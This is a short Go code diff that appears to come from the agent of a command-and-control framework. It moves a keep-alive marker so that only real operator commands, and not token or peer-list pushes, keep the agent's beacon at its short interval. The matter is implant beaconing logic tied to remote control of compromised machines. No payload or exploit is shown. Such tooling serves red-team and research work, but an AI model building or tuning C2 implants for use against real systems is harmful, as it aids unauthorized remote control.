@@ -22,9 +22,6 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 			logging.Errorf("HandleC2Command panic: %v", r)
 		}
 	}()
-	// anything arriving from the CC means the operator is (or was) engaged:
-	// keep the keep-alive loop at its short cadence (see relayHelloBackoff)
-	c2transport.MarkAgentActive()
 
 	// Handle AgentToken push from C2
 	if cmdData.Tag == def.TagAgentToken {
@@ -84,6 +81,11 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 		}
 		return
 	}
+
+	// A real command from the operator: keep the keep-alive loop at its
+	// short cadence (see relayHelloBackoff). Token/PeerList pushes do NOT
+	// count — they fire on every hello and would permanently mask idleness.
+	c2transport.MarkAgentActive()
 
 	job_id := cmdData.JobID
 	cmd_argc := len(cmdData.CmdSlice)
